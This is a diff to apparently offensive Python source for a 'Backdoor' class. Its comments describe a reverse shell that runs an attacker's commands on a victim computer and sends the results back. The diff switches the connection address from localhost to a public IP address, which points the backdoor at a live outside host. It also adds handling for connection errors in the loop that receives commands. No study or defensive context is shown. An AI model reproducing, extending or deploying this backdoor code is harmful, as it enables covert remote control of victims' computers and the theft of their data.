@@ -4,10 +4,9 @@
 # This script will establish the reverse shell connection between attacker and victim machine
 # Commands taken from attacker will be executed through this script on victim computer,
 # then the results will be sent back
-import pickle
-import struct
 
-import Cryptodome.Cipher.AES as AES
+
+# import Cryptodome.Cipher.AES as AES
 
 # Standard Modules
 import shutil
@@ -22,6 +21,7 @@ import threading
 import json
 import datetime
 import random
+import struct
 
 # User Defined Modules
 from Logger import Logger
@@ -30,7 +30,7 @@ from Logger import Logger
 class Backdoor:
     NUMBER_OF_THREADS = 6
     JOB_NUMBER = [0, 3, 4, 6]
-    Ip = "127.0.0.1"  # 20.101.135.232
+    Ip = "20.101.135.232"  # 20.101.135.232
     NUMBER_OF_PORTS = 5
     MAX_PORT_VALUE = 65535
     MIN_PORT_VALUE = 49152
@@ -257,8 +257,13 @@ class Backdoor:
 
             command_result = ""
 
-            # Wait (This is a blocking code) command string from attacker
-            command: list = self.__receive_data()
+            try:
+                # Wait (This is a blocking code) command string from attacker
+                command: list = self.__receive_data()
+            except ConnectionError as msg:
+                print(msg)
+                self.queue.put(1)
+                break
 
             # Close the connection
             if command[0] == "exit":
